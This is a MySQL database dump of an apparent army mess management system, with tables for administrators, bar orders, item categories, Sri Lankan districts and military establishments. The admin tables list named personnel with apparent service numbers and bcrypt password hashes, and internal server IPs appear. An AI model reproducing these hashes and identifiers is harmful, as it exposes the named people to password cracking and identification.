/*
 Navicat Premium Data Transfer

 Source Server         : 172.16.60.29
 Source Server Type    : MySQL
 Source Server Version : 80031 (8.0.31-0ubuntu0.22.04.1)
 Source Host           : 172.16.60.29:3306
 Source Schema         : db_omms

 Target Server Type    : MySQL
 Target Server Version : 80031 (8.0.31-0ubuntu0.22.04.1)
 File Encoding         : 65001

 Date: 01/02/2023 13:52:38
*/

SET NAMES utf8mb4;
SET FOREIGN_KEY_CHECKS = 0;

-- ----------------------------
-- Table structure for admins
-- ----------------------------
DROP TABLE IF EXISTS `admins`;
CREATE TABLE `admins`  (
  `id` bigint UNSIGNED NOT NULL AUTO_INCREMENT,
  `name` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `mess_id` int NULL DEFAULT NULL,
  `user_type` int NULL DEFAULT NULL,
  `estb` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `active` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `email` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `email_verified_at` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `password` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `remember_token` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `deactivated_at` timestamp NULL DEFAULT NULL,
  `updated_at` date NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 8 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of admins
-- ----------------------------
INSERT INTO `admins` VALUES (1, 'Super User', NULL, 1, NULL, '1', '100380843', NULL, '$2y$10$GQ2TevpKQ6DqcR2DE7zAQOO0.zhgar7y440b5hZa.NsF7HQTmbsyG', NULL, '2023-01-11 10:25:52', NULL, NULL);
INSERT INTO `admins` VALUES (2, 'KWD SACHINTHANA  ', 1, 2, '11', '1', '100380923', NULL, '$2y$10$iUTQgENsuerllwwbeAxs5uz5kY17FgYf/hkCMMU8iNOJhoj4dOVTy', NULL, '2023-01-31 09:25:20', NULL, '2023-01-31');
INSERT INTO `admins` VALUES (3, 'TMSU THENNAKOON  ', 1, 3, '11', '0', '100380912', NULL, '$2y$10$bl2DJZOYC2gQW0OaWcROcePACrgcqGdw7SAaVCl2FoZRG00LROI2e', NULL, '2023-01-31 09:28:34', '2023-01-31 00:00:00', '2023-01-31');
INSERT INTO `admins` VALUES (4, 'Chandika DGP  ', 1, 3, '11', '1', '100019574', NULL, '$2y$10$6oSTqM.XygixPu5d4mai4ulgE.rhWRyqDhv1gVkAaqo5kGipmTOB2', NULL, '2023-01-31 09:29:20', NULL, '2023-01-31');
INSERT INTO `admins` VALUES (5, 'Balachndra DMD  USP ', 1, 3, '11', '1', '100019466', NULL, '$2y$10$ktrRbeCINyO4bI1uoeFLXOx13NtColaWaLnEraamhqcArd9rzsIZG', NULL, '2023-01-31 09:29:38', NULL, '2023-01-31');
INSERT INTO `admins` VALUES (6, 'SJG VITANA   USP ', 1, 3, '11', '1', '100019468', NULL, '$2y$10$.pbjyTRaOE712bTdyi0FBuLJXqTbyst3D7ouSAuhQUEPkWrvEnYAO', NULL, '2023-01-31 09:29:53', NULL, '2023-01-31');
INSERT INTO `admins` VALUES (7, 'Pathirana UPIP  ', 1, 3, '11', '1', '100019469', NULL, '$2y$10$Wk12lM9s4e9.65jt0mHgse62wgC/xZijIe.Aq8ziVd/NIy6/6zReu', NULL, '2023-01-31 09:30:06', NULL, '2023-01-31');

-- ----------------------------
-- Table structure for admins_copy1
-- ----------------------------
DROP TABLE IF EXISTS `admins_copy1`;
CREATE TABLE `admins_copy1`  (
  `id` bigint UNSIGNED NOT NULL AUTO_INCREMENT,
  `name` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `mess_id` int NULL DEFAULT NULL,
  `user_type` int NULL DEFAULT NULL,
  `estb` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `active` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `email` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `email_verified_at` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `password` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `remember_token` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 7 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of admins_copy1
-- ----------------------------
INSERT INTO `admins_copy1` VALUES (1, 'Super User', NULL, 1, NULL, '1', '100380843', NULL, '$2y$10$GQ2TevpKQ6DqcR2DE7zAQOO0.zhgar7y440b5hZa.NsF7HQTmbsyG', NULL, '2023-01-11 10:25:52', NULL);
INSERT INTO `admins_copy1` VALUES (2, 'J H H Perera  ', 1, 2, '15', '1', '100008618', NULL, '$2y$10$Ts0KFJHTWJ.IJZAcRG81Z.tfVCttTm3C2jSzgQ/VW3RQJY84h1sYW', NULL, '2023-01-16 10:07:28', '2023-01-16 10:07:28');
INSERT INTO `admins_copy1` VALUES (3, 'Chandika DGP  ', 1, 3, '15', '1', '100019574', NULL, '$2y$10$V9y..srcKmvitAgzfuRNwek1rdWrIIGUvqhCXkb9j9fWcY1IEuvS2', NULL, '2023-01-16 10:12:41', '2023-01-16 10:12:41');
INSERT INTO `admins_copy1` VALUES (4, 'Balachndra DMD  USP ', 1, 3, '15', '1', '100019466', NULL, '$2y$10$bmKo2VaGtRE75yr7vRfPSelArqLmkFT5/ZL36vqgTUBA6DWXjjb8a', NULL, '2023-01-16 10:35:52', '2023-01-16 10:35:52');
INSERT INTO `admins_copy1` VALUES (5, 'SJG VITANA   USP', 1, 3, '15', '1', '100019468', NULL, '$2y$10$OMSkWS8l4Zit/OdV7sZPP.lX0gHuqzJPDWNKKaPRXkKICFly0sGVO', NULL, '2023-01-16 10:36:10', '2023-01-16 10:36:28');
INSERT INTO `admins_copy1` VALUES (6, 'Pathirana UPIP  ', 1, 3, '15', '1', '100019469', NULL, '$2y$10$rW0jBlkoDNM09ALG9RRgC.sgP..t6jYJ/aX2tLkp1eRmvjWXb7QHO', NULL, '2023-01-16 10:37:23', '2023-01-16 10:37:23');

-- ----------------------------
-- Table structure for ahq_establishments
-- ----------------------------
DROP TABLE IF EXISTS `ahq_establishments`;
CREATE TABLE `ahq_establishments`  (
  `id` bigint UNSIGNED NOT NULL AUTO_INCREMENT,
  `ahq_establishment` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `abreviation` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_by` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `updated_by` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 3 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of ahq_establishments
-- ----------------------------
INSERT INTO `ahq_establishments` VALUES (1, 'SLSC D Branch', 'SLSCDBr', '1', NULL, '2023-02-01 07:00:19', '2023-02-01 07:00:19');
INSERT INTO `ahq_establishments` VALUES (2, 'test23334', 't23334', '1', '1', '2023-02-01 08:22:03', '2023-02-01 08:23:26');

-- ----------------------------
-- Table structure for bars
-- ----------------------------
DROP TABLE IF EXISTS `bars`;
CREATE TABLE `bars`  (
  `id` bigint UNSIGNED NOT NULL AUTO_INCREMENT,
  `officer_id` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `order_dt` date NOT NULL,
  `category` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `item` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `measure` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `qty` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `price` double(20, 2) NOT NULL,
  `created_by` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `updated_by` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 6 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of bars
-- ----------------------------
INSERT INTO `bars` VALUES (1, '100008618', '2023-02-01', '6', '2', '7', '2', 490.00, '2', NULL, '2023-02-01 09:24:11', '2023-02-01 09:24:11');
INSERT INTO `bars` VALUES (2, '100008618', '2023-02-01', '6', '1', '6', '1', 5885.00, '2', NULL, '2023-02-01 09:27:05', '2023-02-01 09:27:05');
INSERT INTO `bars` VALUES (3, '100008618', '2023-02-01', '9', '3', '8', '3', 290.00, '2', NULL, '2023-02-01 09:28:09', '2023-02-01 09:28:09');
INSERT INTO `bars` VALUES (4, '100380913', '2023-02-01', '6', '2', '7', '1', 400.00, '2', NULL, '2023-02-01 11:02:54', '2023-02-01 11:02:54');
INSERT INTO `bars` VALUES (5, '100380913', '2023-02-01', '6', '1', '6', '3', 1500.00, '2', NULL, '2023-02-01 11:04:53', '2023-02-01 11:04:53');

-- ----------------------------
-- Table structure for cat_item
-- ----------------------------
DROP TABLE IF EXISTS `cat_item`;
CREATE TABLE `cat_item`  (
  `item_id` bigint UNSIGNED NOT NULL,
  `category_id` bigint UNSIGNED NOT NULL,
  INDEX `cat_item_item_id_foreign`(`item_id` ASC) USING BTREE,
  INDEX `cat_item_category_id_foreign`(`category_id` ASC) USING BTREE,
  CONSTRAINT `cat_item_category_id_foreign` FOREIGN KEY (`category_id`) REFERENCES `categories` (`id`) ON DELETE CASCADE ON UPDATE RESTRICT,
  CONSTRAINT `cat_item_item_id_foreign` FOREIGN KEY (`item_id`) REFERENCES `items` (`id`) ON DELETE CASCADE ON UPDATE RESTRICT
) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of cat_item
-- ----------------------------
INSERT INTO `cat_item` VALUES (1, 5);
INSERT INTO `cat_item` VALUES (1, 6);
INSERT INTO `cat_item` VALUES (1, 8);
INSERT INTO `cat_item` VALUES (2, 5);
INSERT INTO `cat_item` VALUES (2, 6);
INSERT INTO `cat_item` VALUES (2, 7);
INSERT INTO `cat_item` VALUES (3, 5);
INSERT INTO `cat_item` VALUES (3, 9);

-- ----------------------------
-- Table structure for cat_mes
-- ----------------------------
DROP TABLE IF EXISTS `cat_mes`;
CREATE TABLE `cat_mes`  (
  `measure_unit_id` bigint UNSIGNED NOT NULL,
  `category_id` bigint UNSIGNED NOT NULL,
  INDEX `cat_mes_measure_unit_id_foreign`(`measure_unit_id` ASC) USING BTREE,
  INDEX `cat_mes_category_id_foreign`(`category_id` ASC) USING BTREE,
  CONSTRAINT `cat_mes_category_id_foreign` FOREIGN KEY (`category_id`) REFERENCES `categories` (`id`) ON DELETE RESTRICT ON UPDATE RESTRICT,
  CONSTRAINT `cat_mes_measure_unit_id_foreign` FOREIGN KEY (`measure_unit_id`) REFERENCES `measure_units` (`id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of cat_mes
-- ----------------------------
INSERT INTO `cat_mes` VALUES (1, 1);
INSERT INTO `cat_mes` VALUES (1, 2);
INSERT INTO `cat_mes` VALUES (1, 3);
INSERT INTO `cat_mes` VALUES (1, 4);
INSERT INTO `cat_mes` VALUES (2, 1);
INSERT INTO `cat_mes` VALUES (2, 2);
INSERT INTO `cat_mes` VALUES (2, 3);
INSERT INTO `cat_mes` VALUES (2, 4);
INSERT INTO `cat_mes` VALUES (3, 6);
INSERT INTO `cat_mes` VALUES (3, 9);
INSERT INTO `cat_mes` VALUES (3, 7);
INSERT INTO `cat_mes` VALUES (3, 8);
INSERT INTO `cat_mes` VALUES (4, 6);
INSERT INTO `cat_mes` VALUES (4, 9);
INSERT INTO `cat_mes` VALUES (4, 7);
INSERT INTO `cat_mes` VALUES (4, 8);
INSERT INTO `cat_mes` VALUES (5, 7);
INSERT INTO `cat_mes` VALUES (5, 8);
INSERT INTO `cat_mes` VALUES (6, 7);
INSERT INTO `cat_mes` VALUES (6, 8);
INSERT INTO `cat_mes` VALUES (7, 7);
INSERT INTO `cat_mes` VALUES (8, 9);

-- ----------------------------
-- Table structure for categories
-- ----------------------------
DROP TABLE IF EXISTS `categories`;
CREATE TABLE `categories`  (
  `id` bigint UNSIGNED NOT NULL AUTO_INCREMENT,
  `name` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `active` tinyint NOT NULL DEFAULT 1,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `ip` varchar(15) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `creater_id` bigint UNSIGNED NOT NULL,
  `establishment_id` bigint UNSIGNED NULL DEFAULT NULL,
  `parent_id` int NOT NULL,
  `code` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  PRIMARY KEY (`id`) USING BTREE,
  INDEX `categories_creater_id_index`(`creater_id` ASC) USING BTREE,
  INDEX `categories_establishment_id_index`(`establishment_id` ASC) USING BTREE,
  CONSTRAINT `categories_created_id_foreign` FOREIGN KEY (`creater_id`) REFERENCES `admins` (`id`) ON DELETE CASCADE ON UPDATE RESTRICT,
  CONSTRAINT `categories_establishment_id_foreign` FOREIGN KEY (`establishment_id`) REFERENCES `messes` (`id`) ON DELETE CASCADE ON UPDATE RESTRICT
) ENGINE = InnoDB AUTO_INCREMENT = 10 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of categories
-- ----------------------------
INSERT INTO `categories` VALUES (1, 'Fresh Ration', 1, '2023-01-31 09:24:48', '2023-01-31 09:24:48', '172.16.66.104', 1, 1, 0, 'fresh_ration');
INSERT INTO `categories` VALUES (2, 'Vegetable', 1, '2023-01-31 09:24:48', '2023-01-31 09:24:48', '172.16.66.104', 1, 1, 1, 'vegetable');
INSERT INTO `categories` VALUES (3, 'Dry Ration', 1, '2023-01-31 09:24:48', '2023-01-31 09:24:48', '172.16.66.104', 1, 1, 0, 'dry_ration');
INSERT INTO `categories` VALUES (4, 'Rice', 1, '2023-01-31 09:24:48', '2023-01-31 09:24:48', '172.16.66.104', 1, 1, 3, 'rice');
INSERT INTO `categories` VALUES (5, 'Bar Item', 1, '2023-01-31 09:24:48', '2023-01-31 09:24:48', '172.16.66.104', 1, 1, 0, 'bar_item');
INSERT INTO `categories` VALUES (6, 'Liquor', 1, '2023-01-31 09:24:48', '2023-01-31 09:24:48', '172.16.66.104', 1, 1, 5, 'liquor');
INSERT INTO `categories` VALUES (7, 'Beer', 1, '2023-01-31 09:24:48', '2023-01-31 09:24:48', '172.16.66.104', 1, 1, 6, 'beer');
INSERT INTO `categories` VALUES (8, 'Whisky', 1, '2023-01-31 09:24:48', '2023-01-31 09:24:48', '172.16.66.104', 1, 1, 6, 'whisky');
INSERT INTO `categories` VALUES (9, 'Canteen', 1, '2023-01-31 09:24:48', '2023-01-31 09:24:48', '172.16.66.104', 1, 1, 5, 'canteen');

-- ----------------------------
-- Table structure for districts
-- ----------------------------
DROP TABLE IF EXISTS `districts`;
CREATE TABLE `districts`  (
  `id` bigint UNSIGNED NOT NULL AUTO_INCREMENT,
  `district_name` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 26 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of districts
-- ----------------------------
INSERT INTO `districts` VALUES (1, 'Ampara', '2023-01-25 18:17:35', '2023-01-13 18:17:38');
INSERT INTO `districts` VALUES (2, 'Anuradhapura', NULL, NULL);
INSERT INTO `districts` VALUES (3, 'Badulla', NULL, NULL);
INSERT INTO `districts` VALUES (4, 'Colombo', NULL, NULL);
INSERT INTO `districts` VALUES (5, 'Gampaha', NULL, NULL);
INSERT INTO `districts` VALUES (6, 'Kalutara', NULL, NULL);
INSERT INTO `districts` VALUES (7, 'Kandy', NULL, NULL);
INSERT INTO `districts` VALUES (8, 'Matale', NULL, NULL);
INSERT INTO `districts` VALUES (9, 'Nuwara Eliya', NULL, NULL);
INSERT INTO `districts` VALUES (10, 'Galle', NULL, NULL);
INSERT INTO `districts` VALUES (11, 'Matara', NULL, NULL);
INSERT INTO `districts` VALUES (12, 'Hambantota', NULL, NULL);
INSERT INTO `districts` VALUES (13, 'Jaffna', NULL, NULL);
INSERT INTO `districts` VALUES (14, 'Kilinochchi', NULL, NULL);
INSERT INTO `districts` VALUES (15, 'Mannar', NULL, NULL);
INSERT INTO `districts` VALUES (16, 'Vavuniya', NULL, NULL);
INSERT INTO `districts` VALUES (17, 'Mullaitivu', NULL, NULL);
INSERT INTO `districts` VALUES (18, 'Batticaloa', NULL, NULL);
INSERT INTO `districts` VALUES (19, 'Trincomalee', NULL, NULL);
INSERT INTO `districts` VALUES (20, 'Kurunegala', NULL, NULL);
INSERT INTO `districts` VALUES (21, 'Puttalam', NULL, NULL);
INSERT INTO `districts` VALUES (22, 'Polonnaruwa', NULL, NULL);
INSERT INTO `districts` VALUES (23, 'Moneragala', NULL, NULL);
INSERT INTO `districts` VALUES (24, 'Ratnapura', NULL, NULL);
INSERT INTO `districts` VALUES (25, 'Kegalle', NULL, NULL);

-- ----------------------------
-- Table structure for establishments
-- ----------------------------
DROP TABLE IF EXISTS `establishments`;
CREATE TABLE `establishments`  (
  `id` bigint UNSIGNED NOT NULL AUTO_INCREMENT,
  `establishment` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `abbr` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_by` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `updated_by` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `version` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `deleted_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 38 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of establishments
-- ----------------------------
INSERT INTO `establishments` VALUES (1, '1 Corps', '1-corps', NULL, NULL, NULL, '2022-12-01 01:23:55', NULL, NULL);
INSERT INTO `establishments` VALUES (2, 'Security Forces Headquarters - Jaffna', 'SFHQ-J', NULL, NULL, NULL, '2022-12-01 01:23:55', NULL, NULL);
INSERT INTO `establishments` VALUES (3, 'Security Forces Headquarters - Wanni', 'SFHQ-W', NULL, NULL, NULL, '2022-12-01 01:23:55', NULL, NULL);
INSERT INTO `establishments` VALUES (4, 'Security Forces Headquarters - East', 'SFHQ-E', NULL, NULL, NULL, '2022-12-01 01:23:55', NULL, NULL);
INSERT INTO `establishments` VALUES (5, 'Security Forces Headquarters - Mullaittivu', 'SFHQ-MLT', NULL, NULL, NULL, '2022-12-01 01:23:55', NULL, NULL);
INSERT INTO `establishments` VALUES (6, 'Security Forces Headquarters - West', 'SFHQ-West', NULL, NULL, NULL, '2022-12-01 01:23:55', NULL, NULL);
INSERT INTO `establishments` VALUES (7, 'Security Forces Headquarters - Central', 'SFHQ-Cen', NULL, NULL, NULL, '2022-12-01 01:23:55', NULL, NULL);
INSERT INTO `establishments` VALUES (8, 'Sri Lanka Armoured Corps', 'SLAC', NULL, NULL, NULL, '2022-12-01 01:23:55', NULL, NULL);
INSERT INTO `establishments` VALUES (9, 'Sri Lanka Artillery', 'SLA', NULL, NULL, NULL, '2022-12-01 01:23:55', NULL, NULL);
INSERT INTO `establishments` VALUES (10, 'Sri Lanka Engineers', 'SLE', NULL, NULL, NULL, '2022-12-01 01:23:55', NULL, NULL);
INSERT INTO `establishments` VALUES (11, 'Sri Lanka Signal Corps', 'SLSC', NULL, NULL, NULL, '2022-12-01 01:23:55', NULL, NULL);
INSERT INTO `establishments` VALUES (12, 'Sri Lanka Light Infantry', 'SLLI', NULL, NULL, NULL, '2022-12-01 01:23:55', NULL, NULL);
INSERT INTO `establishments` VALUES (13, 'Sri Lanka Sinha Regiment', 'SLSR', NULL, NULL, NULL, '2022-12-01 01:23:55', NULL, NULL);
INSERT INTO `establishments` VALUES (14, 'Gamunu Watch', 'GW', NULL, NULL, NULL, '2022-12-01 01:23:55', NULL, NULL);
INSERT INTO `establishments` VALUES (15, 'Gajaba Regiment', 'GR', NULL, NULL, NULL, '2022-12-01 01:23:55', NULL, NULL);
INSERT INTO `establishments` VALUES (16, 'Vijayabahu Infantry Regiment', 'VIR', NULL, NULL, NULL, '2022-12-01 01:23:55', NULL, NULL);
INSERT INTO `establishments` VALUES (17, 'Mechanized Infantry Regiment', 'Mech-Inf', NULL, NULL, NULL, '2022-12-01 01:23:55', NULL, NULL);
INSERT INTO `establishments` VALUES (18, 'Commando Regiment', 'CR', NULL, NULL, NULL, '2022-12-01 01:23:55', NULL, NULL);
INSERT INTO `establishments` VALUES (19, 'Special Forces Regiment', 'SF', NULL, NULL, NULL, '2022-12-01 01:23:55', NULL, NULL);
INSERT INTO `establishments` VALUES (20, 'Military Intelligence Corps', 'MIC', NULL, NULL, NULL, '2022-12-01 01:23:55', NULL, NULL);
INSERT INTO `establishments` VALUES (21, 'Corps of Engineer Services', 'CES', NULL, NULL, NULL, '2022-12-01 01:23:55', NULL, NULL);
INSERT INTO `establishments` VALUES (22, 'Sri Lanka Army Service Corps', 'SLASC', NULL, NULL, NULL, '2022-12-01 01:23:55', NULL, NULL);
INSERT INTO `establishments` VALUES (23, 'Sri Lanka Army Medical Corps', 'SLAMC', NULL, NULL, NULL, '2022-12-01 01:23:55', NULL, NULL);
INSERT INTO `establishments` VALUES (24, 'Sri Lanka Army Ordnance Corps', 'SLAOC', NULL, NULL, NULL, '2022-12-01 01:23:55', NULL, NULL);
INSERT INTO `establishments` VALUES (25, 'Sri Lanka Electrical and Mechanical Engineers', 'SLEME', NULL, NULL, NULL, '2022-12-01 01:23:55', NULL, NULL);
INSERT INTO `establishments` VALUES (26, 'Sri Lanka Corps of Military Police', 'SLCMP', NULL, '1', NULL, '2022-12-01 01:23:55', '2023-01-17 11:01:02', NULL);
INSERT INTO `establishments` VALUES (27, 'Sri Lanka Army GeneralService Corps', 'SLAGSC', NULL, NULL, NULL, '2022-12-01 01:23:55', NULL, NULL);
INSERT INTO `establishments` VALUES (28, 'Sri Lanka Army Womens Corps', 'SLAWC', NULL, NULL, NULL, '2022-12-01 01:23:55', NULL, NULL);
INSERT INTO `establishments` VALUES (29, 'Sri Lanka Rifle Corps', 'SLRC', NULL, NULL, NULL, '2022-12-01 01:23:55', NULL, NULL);
INSERT INTO `establishments` VALUES (30, 'Sri Lanka Army Pineer Corps', 'SLAPC', NULL, NULL, NULL, '2022-12-01 01:23:55', NULL, NULL);
INSERT INTO `establishments` VALUES (31, 'Sri Lanka National Guard', 'SLNG', NULL, NULL, NULL, '2022-12-01 01:23:55', NULL, NULL);
INSERT INTO `establishments` VALUES (32, 'Corps of Agriculture and Livestock', 'CAL', NULL, '1', NULL, '2022-12-01 01:23:55', '2023-01-17 10:23:01', NULL);
INSERT INTO `establishments` VALUES (37, '11 Sri Lanka Signal Corps', '11 SLSC', '1', NULL, '1', '2023-01-17 15:37:33', '2023-01-18 11:33:54', '2023-01-18 11:33:54');

-- ----------------------------
-- Table structure for establishments_copy1
-- ----------------------------
DROP TABLE IF EXISTS `establishments_copy1`;
CREATE TABLE `establishments_copy1`  (
  `id` bigint UNSIGNED NOT NULL AUTO_INCREMENT,
  `establishment` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `abbr` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_by` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `updated_by` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `version` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NULL DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `deleted_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 385 CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci ROW_FORMAT = Dynamic;

-- ----------------------------
-- Records of establishments_copy1
-- ----------------------------
INSERT INTO `establishments_copy1` VALUES (1, '1 Corps', '1-corps', NULL, NULL, NULL, '2022-12-01 01:23:55', NULL, NULL);
INSERT INTO `establishments_copy1` VALUES (2, 'Security Forces Headquarters - Jaffna', 'SFHQ-J', NULL, NULL, NULL, '2022-12-01 01:23:55', NULL, NULL);
INSERT INTO `establishments_copy1` VALUES (3, 'Security Forces Headquarters - Wanni', 'SFHQ-W', NULL, NULL, NULL, '2022-12-01 01:23:55', NULL, NULL);
INSERT INTO `establishments_copy1` VALUES (4, 'Security Forces Headquarters - East', 'SFHQ-E', NULL, NULL, NULL, '2022-12-01 01:23:55', NULL, NULL);
INSERT INTO `establishments_copy1` VALUES (5, 'Security Forces Headquarters - Mullaittivu', 'SFHQ-MLT', NULL, NULL, NULL, '2022-12-01 01:23:55', NULL, NULL);
INSERT INTO `establishments_copy1` VALUES (6, 'Security Forces Headquarters - West', 'SFHQ-West', NULL, NULL, NULL, '2022-12-01 01:23:55', NULL, NULL);
INSERT INTO `establishments_copy1` VALUES (7, 'Security Forces Headquarters - Central', 'SFHQ-Cen', NULL, NULL, NULL, '2022-12-01 01:23:55', NULL, NULL);
INSERT INTO `establishments_copy1` VALUES (8, 'Sri Lanka Armoured Corps', 'SLAC', NULL, NULL, NULL, '2022-12-01 01:23:55', NULL, NULL);
INSERT INTO `establishments_copy1` VALUES (9, 'Sri Lanka Artillery', 'SLA', NULL, NULL, NULL, '2022-12-01 01:23:55', NULL, NULL);
INSERT INTO `establishments_copy1` VALUES (10, 'Sri Lanka Engineers', 'SLE', NULL, NULL, NULL, '2022-12-01 01:23:55', NULL, NULL);
INSERT INTO `establishments_copy1` VALUES (11, 'Sri Lanka Signal Corps', 'SLSC', NULL, NULL, NULL, '2022-12-01 01:23:55', NULL, NULL);
INSERT INTO `establishments_copy1` VALUES (12, 'Sri Lanka Light Infantry', 'SLLI', NULL, NULL, NULL, '2022-12-01 01:23:55', NULL, NULL);
INSERT INTO `establishments_copy1` VALUES (13, 'Sri Lanka Sinha Regiment', 'SLSR', NULL, NULL, NULL, '2022-12-01 01:23:55', NULL, NULL);
INSERT INTO `establishments_copy1` VALUES (14, 'Gamunu Watch', 'GW', NULL, NULL, NULL, '2022-12-01 01:23:55', NULL, NULL);
INSERT INTO `establishments_copy1` VALUES (15, 'Gajaba Regiment', 'GR', NULL, NULL, NULL, '2022-12-01 01:23:55', NULL, NULL);
INSERT INTO `establishments_copy1` VALUES (16, 'Vijayabahu Infantry Regiment', 'VIR', NULL, NULL, NULL, '2022-12-01 01:23:55', NULL, NULL);
INSERT INTO `establishments_copy1` VALUES (17, 'Mechanized Infantry Regiment', 'Mech-Inf', NULL, NULL, NULL, '2022-12-01 01:23:55', NULL, NULL);
INSERT INTO `establishments_copy1` VALUES (18, 'Commando Regiment', 'CR', NULL, NULL, NULL, '2022-12-01 01:23:55', NULL, NULL);
